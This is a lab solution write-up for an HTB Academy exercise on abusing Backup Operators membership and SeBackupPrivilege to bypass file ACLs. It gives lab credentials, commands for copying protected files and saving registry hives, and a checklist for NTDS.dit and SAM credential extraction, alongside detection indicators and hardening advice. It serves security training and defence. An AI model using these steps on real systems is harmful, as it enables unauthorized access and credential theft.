# 🛰️ HTB Academy Lab Solution

## 🎯 Objectives

- **Credentials**: `svc_backup:HTB_@cademy_stdnt!`
- **Access Method**: RDP
- **Objective**: Leverage SeBackupPrivilege to obtain flag at `c:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt`

---

## 💡 Overview

This lab requires leveraging the Backup Operators group membership and the SeBackupPrivilege to bypass file system ACLs and access restricted files.

### 📜 Lab Environment
- **RDP Access**: Connect via RDP using `svc_backup:HTB_@cademy_stdnt!`
- **Objective**: Obtain flag from Administrator's desktop

---

## 🔍 Detailed Steps

### 1. RDP Connection

```bash
# Connect to the target machine via RDP
xfreerdp /v:[TARGET_IP] /u:svc_backup /p:'HTB_@cademy_stdnt!'
```

[!SUCCESS]

### 2. Verify Group Membership and Privileges

#### 🛠️ Check Group Memberships

```cmd
# Open Command Prompt in RDP session
whoami /groups
```

Look for the Backup Operators group membership:

```plaintext
BUILTIN\Backup Operators                       S-1-5-32-551
```

[!SUCCESS]

#### 🛠️ Check SeBackupPrivilege Status

```cmd
# Open Command Prompt in RDP session
whoami /priv
```

Expected output showing `SeBackupPrivilege` is disabled:

```plaintext
SeBackupPrivilege             Back up files and directories  Disabled
```

[!WARNING]

### 3. Enable SeBackupPrivilege

#### 🛠️ Enable Privilege with PowerShell Modules

- **Download required modules** (if not present):
  - `SeBackupPrivilegeUtils.dll`
  - `SeBackupPrivilegeCmdLets.dll`

```powershell
# Open elevated PowerShell (Run as Administrator)
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll

Set-SeBackupPrivilege
```

#### 🛠️ Verify Privilege Activation

```powershell
Get-SeBackupPrivilege
```

Expected output:

```plaintext
SeBackupPrivilege is enabled
```

[!SUCCESS]

### 4. Target File Analysis

- **Attempt Normal Access** to verify file access restrictions.

```cmd
# Open Command Prompt in RDP session
type c:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt
```

Expected output:

```plaintext
Access is denied.
```

[!SUCCESS]

### 5. Bypass Restriction with SeBackupPrivilege

#### 🛠️ Use PowerShell to Copy Restricted File

```powershell
# Open elevated PowerShell (Run as Administrator)
Copy-FileSeBackupPrivilege 'c:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt' .\flag.txt

# Read the copied file
cat .\flag.txt
```

Expected output:

```plaintext
Copied [X] bytes
[REDACTED_FLAG]
```

Submit the flag content.

[!SUCCESS]

### Alternative Methods

#### 🛠️ Robocopy Approach

- **Use robocopy with backup mode** to bypass ACLs:

```cmd
robocopy /B "c:\Users\Administrator\Desktop\SeBackupPrivilege" .\backup flag.txt
```

Read the copied file:

```cmd
type .\backup\flag.txt
```

[!SUCCESS]

#### 🛠️ Registry Approach (if flag in registry)

- **Create a backup of the registry hive** and extract sensitive data.

```powershell
reg save HKLM\SOFTWARE SOFTWARE.SAV

# Extract and analyze offline
```

---

## ⚠️ Limitations and Considerations

### Explicit Deny ACEs

The following steps won't bypass explicit DENY entries:

- **Explicit DENY for current user**
- **Explicit DENY for user's groups**

Always check ACLs before attempting access.

[!WARNING]

### Operational Considerations

Best practices include:
- Testing on non-production systems first
- Documenting all file accesses
- Cleaning up temporary files
- Respecting client data handling policies

---

## 🔍 Detection Indicators

### Process Activity

Monitor for:

```plaintext
- diskshadow.exe execution
- robocopy.exe with /B flag
- Unusual file access patterns in protected directories
- Registry hive backup operations
```

[!INFO]

### Event Logs

Key Event IDs:
```plaintext
Event ID 4656 - Handle to object requested (backup operations)
Event ID 4663 - Access attempt to object (SeBackupPrivilege usage)
Event ID 4673 - Sensitive privilege use (SeBackupPrivilege)
Event ID 5120 - DPAPI key backup (credential access)
```

[!INFO]

### File System Changes

Indicators:
```plaintext
- Temporary shadow copies
- Copied NTDS.dit files
- Registry .SAV files in unusual locations
- PowerShell module imports for privilege manipulation
```

---

## 🛡️ Defense Strategies

### Group Membership Hardening

Regular audits:

- Review Backup Operators membership quarterly.
- Remove unnecessary accounts.
- Document legitimate business justifications.
- Implement approval workflows for additions.

[!SUCCESS]

### Monitoring Implementation

Deploy monitoring for:
```plaintext
- SeBackupPrivilege usage events
- Shadow copy creation activities
- NTDS.dit access attempts
- Registry hive backup operations
```

[!SUCCESS]

### Access Controls

Additional protections:
```plaintext
- Implement NTDS.dit backup monitoring
- Use Protected Process Light (PPL) for LSASS
- Enable Advanced Audit Policy settings
- Deploy EDR solutions for behavioral analysis
```

---

## 📋 Backup Operators Exploitation Checklist

### Prerequisites

- **Backup Operators membership** verified (`whoami /groups`)
- **SeBackupPrivilege available** (may be disabled initially)
- **Elevated context** (Administrator Command Prompt/PowerShell)
- **Required modules** (SeBackupPrivilegeUtils.dll, SeBackupPrivilegeCmdLets.dll)

### Privilege Activation

- **Import PowerShell modules** for privilege manipulation
- **Enable SeBackupPrivilege** (`Set-SeBackupPrivilege`)
- **Verify activation** (`Get-SeBackupPrivilege`)
- **Confirm with whoami** (`whoami /priv`)

[!SUCCESS]

### File System Exploitation

- **Identify target files** (sensitive documents, databases)
- **Test normal access** (verify restriction exists)
- **Use Copy-FileSeBackupPrivilege** to bypass ACLs
- **Verify successful copy** and read content

[!SUCCESS]

### Domain Controller Attacks

- **Create shadow copy** (`diskshadow.exe`)
- **Copy NTDS.dit** from shadow volume
- **Backup registry hives** (SYSTEM, SAM)
- **Extract credentials** (DSInternals or secretsdump.py)

[!DANGER]

### Post-Exploitation

- **Document accessed files** for reporting
- **Clean up temporary files** (shadow copies, copied files)
- **Extract credential data** for further attacks
- **Report findings** with remediation recommendations

---

## 📄 Key Takeaways

1. **Backup Operators membership** provides powerful file system access capabilities via SeBackupPrivilege.
2. **NTDS.dit extraction** is possible on Domain Controllers through shadow copies.
3. **ACL bypass** works for most files except explicit DENY entries.
4. **Registry access** enables local credential extraction (SAM, SYSTEM).
5. **Robocopy alternative** eliminates the need for external PowerShell modules.
6. **Detection possible** through privilege usage monitoring and file access logs.
7. Common oversight: accounts left in group after legitimate backup tasks.

[!INFO]

---